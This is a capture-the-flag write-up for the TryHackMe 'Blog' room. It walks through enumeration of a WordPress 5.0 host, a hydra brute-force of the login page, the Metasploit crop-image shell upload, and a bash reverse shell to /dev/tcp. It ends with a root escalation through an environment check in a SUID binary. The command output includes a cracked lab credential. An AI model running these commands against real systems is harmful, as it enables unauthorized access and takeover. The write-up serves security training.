# Blog

Available at: [TryHackMe](https://tryhackme.com/room/blog)
Made by: [Nameless0ne](https://tryhackme.com/p/Nameless0ne)

This is a medium level box aimed at exploiting a Wordpress website.

## Enumaration

### Nmap

I start every box with `nmap`. Usually with the syntax `nmap -sC -sV -vv -oN nmap.txt IP`. I think it's good practice to also run a scan on all ports like so: `nmap -sC -sV -vv -oN nmap.txt -p- IP`

Output:
```
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3hfvTN6e0P9PLtkjW4dy+6vpFSh1PwKRZrML7ArPzhx1yVxBP7kxeIt3lX/qJWpxyhlsQwoLx8KDYdpOZlX5Br1PskO6H66P+AwPMYwooSq24qC/Gxg4NX9MsH/lzoKnrgLDUaAqGS5ugLw6biXITEVbxrjBNdvrT1uFR9sq+Yuc1JbkF8dxMF51tiQF35g0Nqo+UhjmJJg73S/VI9oQtYzd2GnQC8uQxE8Vf4lZpo6ZkvTDQ7om3t/cvsnNCgwX28/TRcJ53unRPmos13iwIcuvtfKlrP5qIY75YvU4U9nmy3+tjqfB1e5CESMxKjKesH0IJTRhEjAyxjQ1HUINP
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtovk1nbfTPnc/1GUqCcdh8XLsFpDxKYJd96BdYGPjEEdZGPKXv5uHnseNe1SzvLZBoYz7KNpPVQ8uShudDnOI=
|   256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICfVpt7khg8YIghnTYjU1VgqdsCRVz7f1Mi4o4Z45df8
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-generator: WordPress 5.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BLOG<00>             Flags: <unique><active>
|   BLOG<03>             Flags: <unique><active>
|   BLOG<20>             Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48359/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 42051/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 43926/udp): CLEAN (Failed to receive data)
|   Check 4 (port 21654/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2021-01-21T16:06:38+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-21T16:06:38
|_  start_date: N/A
```
Yes, this is massive, but what can we read from this mess? Well, there is a webserver running and as we can see the directory `/wp-admin/` is disallowed in the `robots.txt` file. On port 22 we can see the standard ssh service running, and on port. Next at the very end we see a samba share open to us under the username `guest`. I will remember that and try it later. 

*Open ports*:
```bash
445
80
22
139
```
Now it's time to check out the website.

## Website

Going to the website, we see a pretty standard blog with a special note from the authors mom:
```
Hey Billy!  I think this is such a good idea.  With your recent firing, you can use this blog to write tutorials and guides, helping people that are just getting started in the IT industry like you were.  I’m sure it’ll help a lot of people.  

Remember not to let it get you down!  Stay positive, keep doing what you’re doing and something good will come your way.

Oh and don’t forget to hide this post once you get up and running…that would be embarrassing lol!

iloveyou,
Mom
```

I noticed two things, the name Billy... well obiously, this is Billy Joel's blog. So that might give us a username, next the mothers signoff `iloveyou` written in this format is a password from the infamous wordlist `rockyou.txt`. 

Lets run some more enum, I start with my tool [webctf](https://github.com/xnomas/web-ctf-help), it looks for comments, script sources, image sources and alts and server response headers. 
```
webctf http://10.10.4.221/

=============
COMMENTS
=============

[+] 1 :   .search-toggle 
[+] 2 :   .site-description 
[+] 3 :   .header-titles 
[+] 4 :   .nav-toggle 
[+] 5 :   .header-titles-wrapper 
[+] 6 :   .primary-menu-wrapper 
[+] 7 :   .search-toggle 
[+] 8 :   .header-toggles 
[+] 9 :   .header-navigation-wrapper 
.
.
.
. 
[+] 54 :   #site-footer 

=============
SCRIPTS
=============

[+] 1 : http://blog.thm/wp-content/themes/twentytwenty/assets/js/index.js?ver=1.3
[+] 2 : http://blog.thm/wp-includes/js/wp-embed.min.js?ver=5.0

=============
IMAGES
=============

sources:
--------

alts:
-----

===================
INTERESTING HEADERS
===================

Server : Apache/2.4.29 (Ubuntu)
``` 
Now, I did shorten the comments, cause I didn't find anything of interest. Time for some `gobuster`! 

### Gobuster

`gobuster dir -u http://IP/ -w common.txt -t 15` after being finished with `common.txt` I run `directory-list-2.3-medium.txt`. Both are available in the `/usr/share/wordlists/` directory on Kali.

*common.txt results*:
```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/0 (Status: 301)
/admin (Status: 302)
/atom (Status: 301)
/dashboard (Status: 302)
/embed (Status: 301)
/favicon.ico (Status: 200)
/feed (Status: 301)
/index.php (Status: 301)
/login (Status: 302)
/page1 (Status: 301)
/rdf (Status: 301)
/robots.txt (Status: 200)
/rss2 (Status: 301)
/rss (Status: 301)
/server-status (Status: 403)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-includes (Status: 301)
``` 
*directory-list-2.3-medium.txt results*:
```
/rss (Status: 301)
/login (Status: 302)
/0 (Status: 301)
/feed (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 302)
/rss2 (Status: 301)
/wp-includes (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/' (Status: 301)
/dashboard (Status: 302)
/%20 (Status: 301)
.
.
.
```
A lot of these are just xml represantations of the website, like `/atom` and `/rss`. Time for some wordpress scanning

### Wordpress scanning

Okay, so here's the deal. I don't like the new model of `wpscan`, so I avoid having to create an account to get an API key etc. I tried running the "alternative" `vane`, ofcourse it is quite old and barely works. But after some really hard work, I got two usernames:
```
bjoel
kwheel
```

Please just use `wpscan` and dont be as stubborn as I am. Also, `wpscan` is not needed, clicking on the post authors name under their post is just fine! Their username is then included in the url like so: `http://blog.thm/author/kwheel/`

time for some hydra

### Hydra

Using 
```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.4.221 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:S=302"
```
I found the password for the user `kwheel`. 

### Finding vulnerabilities

`vane` wasnt that bad afterall, atleast it told us the wordpress version! Using the `wappalyzer` browser extension works just fine. 
Run `searchsploit Wordpress 5.0` and we get this output:
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Core 5.0 - Remote Code Execution                                                                                                                                       | php/webapps/46511.js
WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)                                                                                                                      | php/remote/46662.rb      <--------- notice this
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                                                                          | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                                                                                                                          | php/dos/47800.py
WordPress Plugin Custom Pages 0.5.0.1 - Local File Inclusion                                                                                                                     | php/webapps/17119.txt
WordPress Plugin Database Backup < 5.2 - Remote Code Execution (Metasploit)                                                                                                      | php/remote/47187.rb
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                                                              | php/webapps/39553.txt
WordPress Plugin FeedWordPress 2015.0426 - SQL Injection                                                                                                                         | php/webapps/37067.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                                                                        | php/webapps/44943.txt
WordPress Plugin leenk.me 2.5.0 - Cross-Site Request Forgery / Cross-Site Scripting                                                                                              | php/webapps/39704.txt
WordPress Plugin Marketplace Plugin 1.5.0 < 1.6.1 - Arbitrary File Upload                                                                                                        | php/webapps/18988.php
WordPress Plugin Network Publisher 5.0.1 - 'networkpub_key' Cross-Site Scripting                                                                                                 | php/webapps/37174.txt
WordPress Plugin Nmedia WordPress Member Conversation 1.35.0 - 'doupload.php' Arbitrary File Upload                                                                              | php/webapps/37353.php
WordPress Plugin Quick Page/Post Redirect 5.0.3 - Multiple Vulnerabilities                                                                                                       | php/webapps/32867.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                                                                      | php/webapps/48918.sh
WordPress Plugin WP-Property 1.35.0 - Arbitrary File Upload                                                                                                                      | php/webapps/18987.php
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
### Metasploit

The `crop-image` exploit is on metasploit, we can find it using `msfconsole`:
```
msf5 > search crop-image

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
```
so easy, just `use exploit/multi/http/wp_crop_rce` and then view options with `options` and set as needed.

the whole process looks like this:
```bash
msf5 exploit(multi/http/wp_crop_rce) > set PASSWORD ******
PASSWORD => ******
msf5 exploit(multi/http/wp_crop_rce) > set RHOSTS IP
RHOSTS => 10.10.4.221
msf5 exploit(multi/http/wp_crop_rce) > set VHOST blog.thm
VHOST => blog.thm
msf5 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
USERNAME => kwheel
msf5 exploit(multi/http/wp_crop_rce) > exploit

[*] Started reverse TCP handler on 10.8.147.71:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (38247 bytes) to 10.10.4.221
[*] Meterpreter session 1 opened (10.8.147.71:4444 -> 10.10.4.221:43512) at 2021-01-21 14:14:54 -0500
[*] Attempting to clean up files...

meterpreter > getuid
Server username: www-data (33)
```
then in `meterpreter` we can get a normal system shell using the command `shell`. I prefer using a non meterpreter relient shell, so I started a reverse shell call back to my system:
```bash
bash -i >& /dev/tcp/YOUR_IP/8888 0>&1
```
and I started a `netcat` listener in a different terminal tab -> `nc -lvnp 8888`

Time to look for flags :)

## USER

Searching around a bit, I found `/home/bjoel` and a file called `user.txt`:
```bash
www-data@blog:/home/bjoel$ cat user.txt 
You won't find what you're looking for here.

TRY HARDER
```
There was also a pdf, about Joel's termination, we can get that by starting a simple http server with python3 `python3 -m http.server 8888`, but nothing interesting there. 

## PRIVESC

My next thought was about privesc, so I ran two `find` commands:
```bash
find / -type f -user bjoel -perm /4000 2>/dev/null
```
^ This proved fruitless, but I did find a lot of root SUID binaries. 
```bash
find / -type f -user root -perm /4000 2>/dev/null
```
Most of them were normal, except for `/usr/sbin/checker`. Time for good ol' GTFObins! And alas, nothing there, so let's just execute it.

```
Not an Admin.
```
Alright, so I tried using `bash -p /usr/sbin/checker`, but that was obviously stupid and didn't work. 

Next up, `ltrace`:
```bash
www-data@blog:/$ ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
```
Awesome! The binary checks if the enviroment variable `admin` is set, so by using `export admin=admin` and then running `checker` we get to root!
```bash
www-data@blog:/$ export admin=admin
www-data@blog:/$ /usr/sbin/checker 
root@blog:/# whoami
root
```
Now we can get the flags! `root.txt` is in `/root`, as it should be. Now all that is left is to `find` the `user.txt` flag, think you can do it? :)
